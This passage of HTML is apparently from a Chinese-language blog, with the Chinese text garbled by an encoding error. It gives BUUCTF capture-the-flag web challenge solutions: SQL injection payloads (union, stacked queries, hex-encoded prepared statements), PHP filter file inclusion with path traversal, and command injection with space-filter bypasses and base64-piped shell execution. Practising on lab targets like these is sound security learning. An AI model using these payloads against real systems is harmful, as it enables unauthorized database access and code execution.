</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; or true#
</span></span></span><span class="line"><span class="cl"><span class="s1">password=1&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="no">true</span><span class="c1">#
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="2æå®¢å¤§æŒ‘æˆ˜-2019havefun">2ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun
</h2><p>æŸ¥çœ‹æºç è¦getä¼ catçš„å€¼ä¸ºdog</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?cat=dog
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="3hctf-2018warmup">3ã€[HCTF 2018]WarmUp
</h2><p>æŸ¥çœ‹æºç source.php</p>
<p>ç™½åå•åªæœ‰source.phpå’Œhint.php,æ–‡ä»¶åŒ…å«ä¼ fileå‚æ•°,ä¸”æœ‰?æˆªæ–­</p>
<p>æŸ¥çœ‹hint.php</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110165335659.png"
	width="1360"
	height="530"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110165335659_hu11899225416449626265.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110165335659_hu17279174614773837336.png 1024w"
	loading="lazy"
	
		alt="image-20250110165335659"
	
	
		class="gallery-image" 
		data-flex-grow="256"
		data-flex-basis="615px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://347210bf-0468-4578-89c6-04af275f9312.node5.buuoj.cn:81/source.php?file=source.php?../../../../../ffffllllaaaagggg
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¾€ä¸Šè·³ç›®å½•æŸ¥æ‰¾</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110165958069.png"
	width="1260"
	height="740"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110165958069_hu12540316386684838051.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110165958069_hu9830676015277352496.png 1024w"
	loading="lazy"
	
		alt="image-20250110165958069"
	
	
		class="gallery-image" 
		data-flex-grow="170"
		data-flex-basis="408px"
	
></p>
<h2 id="4actf2020-æ–°ç”Ÿèµ›include">4ã€[ACTF2020 æ–°ç”Ÿèµ›]Include
</h2><p>é¢˜ç›®æç¤ºäº†æ–‡ä»¶åŒ…å«ï¼Œè¦æŸ¥çœ‹flag.phpæ–‡ä»¶</p>
<p>ç”¨åˆ°phpä¼ªåè®®å°è£…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php://filter/read=convert.base64-encode/resource=xxx.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é¢˜ç›´æ¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/?file=php://filter/read=convert.base64-encode/resource=flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åbase64è§£ç </p>
<p>å°±å¾—åˆ°flag</p>
<h2 id="5actf2020-æ–°ç”Ÿèµ›exec">5ã€[ACTF2020 æ–°ç”Ÿèµ›]Exec
</h2><p>ç®€å•çš„rce</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip;ls /
</span></span><span class="line"><span class="cl">ip;cd /;cat /flag
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110173300406.png"
	width="805"
	height="355"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110173300406_hu14213091224796805184.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110173300406_hu5994490468352901404.png 1024w"
	loading="lazy"
	
		alt="image-20250110173300406"
	
	
		class="gallery-image" 
		data-flex-grow="226"
		data-flex-basis="544px"
	
></p>
<h2 id="6gxyctf2019ping-ping-ping">6ã€[GXYCTF2019]Ping Ping Ping
</h2><p>å°è¯•äº†å¥½ä¹…æ„Ÿè§‰flagåå­—è¢«è¿‡æ»¤äº†ï¼Œè¿˜æœ‰ç©ºæ ¼è¿‡æ»¤</p>
<p>å…ˆæŸ¥çœ‹index.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://41313055-4ac6-4251-8b42-bee9bd416efc.node5.buuoj.cn:81/?ip=127.0.0.1;cat$IFS$9index.php
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110174908430.png"
	width="1270"
	height="550"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110174908430_hu9447829958966860064.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110174908430_hu13755547570792205052.png 1024w"
	loading="lazy"
	
		alt="image-20250110174908430"
	
	
		class="gallery-image" 
		data-flex-grow="230"
		data-flex-basis="554px"
	
></p>
<h3 id="æ–¹æ³•ä¸€å˜é‡æ‹¼æ¥å­—ç¬¦ä¸²å°†açš„å€¼è¦†ç›–ç„¶åè¿›è¡Œç»•è¿‡">æ–¹æ³•ä¸€ï¼š<strong>å˜é‡æ‹¼æ¥å­—ç¬¦ä¸²â€”â€”å°†açš„å€¼è¦†ç›–ï¼Œç„¶åè¿›è¡Œç»•è¿‡</strong>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åæŸ¥çœ‹æºç å¾—åˆ°flag</p>
<h3 id="æ–¹æ³•äºŒå†…è”æ‰§è¡Œ"><strong>æ–¹æ³•äºŒï¼šå†…è”æ‰§è¡Œ</strong>
</h3><p><em>å†…è”å‡½æ•°ï¼šå°†æŒ‡å®šçš„å‡½æ•°ä½“æ’å…¥å¹¶å–ä»£æ¯ä¸€å¤„è°ƒç”¨è¯¥å‡½æ•°çš„åœ°æ–¹ã€‚</em></p>
<p>åå¼•å·åœ¨linuxä¸­ä½œä¸ºå†…è”æ‰§è¡Œï¼Œæ‰§è¡Œè¾“å‡ºç»“æœã€‚ä¹Ÿå°±æ˜¯è¯´</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">cat</span><span class="w"> </span><span class="o">`</span><span class="n">ls</span><span class="o">`</span><span class="w"> </span><span class="o">//</span><span class="err">æ‰§è¡Œ</span><span class="n">lsè¾“å‡º</span><span class="w"> </span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="w"> </span><span class="err">å’Œ</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">php</span><span class="w"> </span><span class="err">ã€‚ç„¶åå†æ‰§è¡Œ</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">php</span><span class="p">;</span><span class="n">cat</span><span class="w"> </span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">/?</span><span class="n">ip</span><span class="o">=</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">;</span><span class="n">cat</span><span class="err">$</span><span class="n">IFS</span><span class="err">$</span><span class="mi">9</span><span class="o">`</span><span class="n">ls</span><span class="o">`</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="æ–¹æ³•ä¸‰shå‘½ä»¤æ¥æ‰§è¡Œ"><strong>æ–¹æ³•ä¸‰ï¼šshå‘½ä»¤æ¥æ‰§è¡Œ</strong>
</h3><p>åŠ å¯†å‘½ä»¤
echo â€œcat flag.phpâ€ | base64
è§£å¯†å‘½ä»¤å¹¶æ‰§è¡Œ
echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="7suctf-2019easysql">7ã€[SUCTF 2019]EasySQL
</h2><p>å°è¯•å¾ˆå¤šé—­åˆæ–¹å¼éƒ½å›æ˜¾nonono</p>
<p>å°è¯•å †å æ³¨å…¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1;show databases;
</span></span><span class="line"><span class="cl">1;show tables;
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°flagåº”è¯¥åœ¨Flagè¡¨ä¸­</p>
<p>è¾“å…¥é0æ•°å­—&ndash;æœ‰ä¼šæ˜¾ï¼Œè¾“å…¥0æˆ–å­—æ¯&ndash;æ²¡æœ‰å›æ˜¾</p>
<p>ç”±æ­¤å¯ä»¥çŒœæµ‹åç«¯ä»£ç å«æœ‰||æˆ–orè¿ç®—ç¬¦</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select command1 || command2 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">æƒ…å†µä¸€ï¼šè‹¥command1ä¸ºé0æ•°å­—ï¼Œåˆ™ç»“æœä¸º1ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">æƒ…å†µäºŒï¼šè‹¥command1ä¸º0æˆ–å­—æ¯ï¼Œcommand2ä¸ºé0æ•°å­—ï¼Œåˆ™ç»“æœä¸º1ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">æƒ…å†µä¸‰ï¼šcommand1å’Œcommand2éƒ½ä¸ä¸ºé0æ•°å­—ï¼Œåˆ™ç»“æœä¸º0ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="æ–¹æ³•ä¸€ä½¿ç”¨-sql_mode-ä¸­çš„-pipes_as_concat-å‡½æ•°">æ–¹æ³•ä¸€ï¼šä½¿ç”¨ sql_mode ä¸­çš„ PIPES_AS_CONCAT å‡½æ•°
</h3><p>PIPES_AS_CONCATï¼šå°† || æˆ–è¿ç®—ç¬¦ è½¬æ¢ä¸º è¿æ¥å­—ç¬¦ï¼Œå³å°†||å‰åæ‹¼æ¥åˆ°ä¸€èµ·ã€‚</p>
<p>select 1 || flag from Flagçš„æ„æ€å°†å˜æˆ å…ˆæŸ¥è¯¢1 å†æŸ¥è¯¢ flagï¼Œè€Œä¸æ˜¯æŸ¥è¯¢1flag,åªæ˜¯æŸ¥è¯¢çš„ç»“æœä¼šæ‹¼æ¥åˆ°ä¸€èµ·</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1;sql_mode=PIPES_AS_CONCAT;select 1
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="æ–¹æ³•äºŒåˆ©ç”¨éé¢„æœŸæ¼æ´è·å–flag">æ–¹æ³•äºŒï¼šåˆ©ç”¨éé¢„æœŸæ¼æ´è·å–flag
</h3><p>è‹¥è¾“å…¥1ï¼Œ1ã€‚é‚£ä¹ˆsqlè¯­å¥å°±å˜æˆäº† select 1, 1 || flag from Flagã€‚å…¶ä¸­ç”± [1] å’Œ [1 || flag] ä¸¤éƒ¨åˆ†ç»„æˆï¼Œè€Œé [1,1] || [flag]ã€‚éé¢„æœŸæ¼æ´æ˜¯åˆ©ç”¨æ•°æ®åº“å¯¹ç¬¦å·åˆ¤æ–­çš„ä¸å‡†ç¡®å½¢æˆçš„æ¼æ´ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*,1
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¾“å…¥ *ï¼Œ1 åï¼Œsqlè¯­å¥å°±å˜æˆäº† select * , 1 || flag from Flagã€‚</p>
<p>å…¶ä¸­åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š (1) select * from Flag(2) select 1 || flag from Flagã€‚</p>
<h2 id="8æå®¢å¤§æŒ‘æˆ˜-2019lovesql">8ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL
</h2><p>å•å¼•å·é—­åˆ</p>
<p>å°è¯•è”åˆæ³¨å…¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1&#39; union select 1,database(),version()#
</span></span></code></pre></td></tr></table>
</div>
</div><p>çˆ†å‡ºæ•°æ®åº“åæ˜¯geek</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39; union select 1,2,group_concat(schema_name) from
</span></span><span class="line"><span class="cl">information_schema.schemata#
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39; union select 1,2,group_concat(table_name)from information_schema.tables
</span></span><span class="line"><span class="cl">where table_schema=database()#
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39; union select 1,2,group_concat(column_name)from
</span></span><span class="line"><span class="cl">information_schema.columns where table_name=&#39;l0ve1ysq1&#39;#
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39; union select 1,2,(select group_concat(username,0x7e,password)from
</span></span><span class="line"><span class="cl">l0ve1ysq1)#
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åæŸ¥çœ‹æºç å°±å¾—åˆ°flag</p>
<h2 id="9å¼ºç½‘æ¯-2019éšä¾¿æ³¨">9ã€[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨
</h2><p>é—­åˆæ–¹å¼ä¸ºå•å¼•å·</p>
<p>åé¢è”åˆæŸ¥è¯¢å›æ˜¾äº†è¿‡æ»¤çš„å­—ç¬¦</p>
<p>ç”¨å †å æ³¨å…¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;;show databases;#
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;;show tables;#
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‡ºæ¥ä¸¤ä¸ªè¡¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;; show columns from words;#
</span></span><span class="line"><span class="cl">1&#39;; show columns from `1919810931114514`;#
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™è¾¹æ³¨æ„æ•°å­—è¦ç”¨`åå¼•å·åŒ…èµ·æ¥</p>
<p>æ•°å­—è¡¨ä¸­æœ‰flag</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="err">ï¼Œé€šè¿‡</span> <span class="n">rename</span> <span class="err">å…ˆæŠŠ</span> <span class="n">words</span> <span class="err">è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="err">ï¼ŒæŠŠ</span> <span class="mi">1919810931114514</span> <span class="err">è¡¨çš„åå­—æ”¹ä¸º</span> <span class="n">words</span> <span class="err">ã€‚</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">3</span> <span class="err">ï¼Œç»™æ–°</span> <span class="n">words</span> <span class="err">è¡¨æ·»åŠ æ–°çš„åˆ—å</span> <span class="n">id</span> <span class="err">ã€‚</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">4</span><span class="err">ï¼Œå°†</span> <span class="n">flag</span> <span class="err">æ”¹åä¸º</span> <span class="n">data</span> <span class="err">ã€‚</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ–è€…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="err">â€™</span><span class="p">;</span><span class="n">rename</span> <span class="n">tables</span> <span class="n">words</span> <span class="n">to</span> <span class="n">words1</span><span class="p">;</span><span class="n">rename</span> <span class="n">tables</span> <span class="mi">1919810931114514</span> <span class="n">to</span> <span class="n">words</span><span class="p">;</span> <span class="n">alter</span> <span class="n">table</span> <span class="n">words</span> <span class="n">change</span> <span class="n">flag</span> <span class="n">id</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span><span class="c1">#</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">å°†</span><span class="n">wordsè¡¨åæ”¹ä¸ºwords1</span><span class="err">ï¼Œ</span><span class="mi">1919810931114514</span><span class="err">è¡¨åæ”¹ä¸º</span><span class="n">words</span><span class="err">ï¼Œå°†ç°åœ¨çš„</span><span class="n">wordsè¡¨ä¸­çš„flagåˆ—åæ”¹ä¸ºid</span>
</span></span><span class="line"><span class="cl"><span class="err">ç„¶åç”¨</span><span class="mi">1</span><span class="err">â€™</span> <span class="ow">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="c1">#å¾—åˆ°flag</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è§£æ³•äºŒ</p>
<p>å› ä¸ºselectè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å…ˆå°†select * from <code>1919810931114514</code>è¿›è¡Œ16è¿›åˆ¶ç¼–ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">payload</span>
</span></span><span class="line"><span class="cl"><span class="err">å…ˆæŠŠ</span><span class="mi">0</span><span class="n">xselect</span> <span class="o">*</span> <span class="n">from</span> <span class="err">`</span><span class="mi">1919810931114514</span><span class="err">`</span> <span class="mi">16</span><span class="err">è¿›åˆ¶ç¼–ç </span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="err">â€™</span><span class="p">;</span><span class="n">SeT</span><span class="err">@</span><span class="n">a</span><span class="o">=</span><span class="mh">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><span class="p">;</span><span class="n">prepare</span> <span class="n">execsql</span> <span class="n">from</span> <span class="err">@</span><span class="n">a</span><span class="p">;</span><span class="n">execute</span> <span class="n">execsql</span><span class="p">;</span><span class="c1">#</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SELECTå¯ä»¥åœ¨ä¸€æ¡è¯­å¥é‡Œå¯¹å¤šä¸ªå˜é‡åŒæ—¶èµ‹å€¼</span><span class="p">,</span><span class="err">è€Œ</span><span class="n">SETåªèƒ½ä¸€æ¬¡å¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼</span><span class="err">ï¼Œå¦‚ä¸‹ï¼š</span>
</span></span><span class="line"><span class="cl"><span class="err">å¤åˆ¶ä»£ç </span> <span class="err">ä»£ç å¦‚ä¸‹</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">SELECT</span> <span class="err">@</span><span class="n">VAR1</span><span class="o">=</span><span class="err">â€˜</span><span class="n">Y</span><span class="err">â€™</span><span class="p">,</span><span class="err">@</span><span class="n">VAR2</span><span class="o">=</span><span class="err">â€˜</span><span class="n">N</span><span class="err">â€™</span>
</span></span><span class="line"><span class="cl"><span class="err">â€“</span> <span class="err">è€Œ</span><span class="n">SETè¦è¾¾åˆ°åŒæ ·çš„æ•ˆæœ</span><span class="err">ï¼Œéœ€è¦ï¼š</span>
</span></span><span class="line"><span class="cl"><span class="n">SET</span> <span class="err">@</span><span class="n">VAR1</span><span class="o">=</span><span class="err">â€˜</span><span class="n">Y</span><span class="err">â€™</span>
</span></span><span class="line"><span class="cl"><span class="n">SET</span> <span class="err">@</span><span class="n">VAR2</span><span class="o">=</span><span class="err">â€˜</span><span class="n">N</span><span class="err">â€™</span>
</span></span><span class="line"><span class="cl"><span class="n">prepare</span><span class="err">â€¦</span><span class="n">from</span><span class="err">â€¦æ˜¯é¢„å¤„ç†è¯­å¥ï¼Œä¼šè¿›è¡Œç¼–ç è½¬æ¢ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">executeç”¨æ¥æ‰§è¡Œç”±SQLPrepareåˆ›å»ºçš„SQLè¯­å¥</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è§£æ³•ä¸‰</p>
<p>ç”¨handlerå‘½ä»¤æŸ¥çœ‹ï¼Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;; handler 1919810931114514 open as a;handler a read next;#
</span></span><span class="line"><span class="cl">handlerä»£æ›¿selectï¼Œä»¥ä¸€è¡Œä¸€è¡Œæ˜¾ç¤ºå†…å®¹
</span></span><span class="line"><span class="cl">openæ‰“å¼€è¡¨
</span></span><span class="line"><span class="cl">asæ›´æ”¹è¡¨çš„åˆ«åä¸ºa
</span></span><span class="line"><span class="cl">read nextè¯»å–æ•°æ®æ–‡ä»¶å†…çš„æ•°æ®æ¬¡æ•°
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="10æå®¢å¤§æŒ‘æˆ˜-2019secret-file">10ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File
</h2><p>æŸ¥çœ‹æºç ï¼Œå‘ç°å…¶ä»–phpæ–‡ä»¶</p>
<p>end.phpå‰é¢çš„æ–‡ä»¶æŠ“åŒ…</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110202811560.png"
	width="1334"
	height="557"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110202811560_hu5151190173147087930.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110202811560_hu4440660311575203877.png 1024w"
	loading="lazy"
	
		alt="image-20250110202811560"
	
	
		class="gallery-image" 
		data-flex-grow="239"
		data-flex-basis="574px"
	
></p>
<p>å‘ç°secr3t.php</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110202903072.png"
	width="1310"
	height="519"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110202903072_hu1330968836301971618.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110202903072_hu17112848750795538117.png 1024w"
	loading="lazy"
	
		alt="image-20250110202903072"
	
	
		class="gallery-image" 
		data-flex-grow="252"
		data-flex-basis="605px"
	
></p>
<p>è®¿é—®flag.php</p>
<p>ç”¨å‰é¢Includeçš„æ–¹æ³•phpä¼ªåè®®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110203206112.png"
	width="1022"
	height="900"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110203206112_hu7793180927182112151.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110203206112_hu4161421072210040081.png 1024w"
	loading="lazy"
	
		alt="image-20250110203206112"
	
	
		class="gallery-image" 
		data-flex-grow="113"
		data-flex-basis="272px"
	
></p>
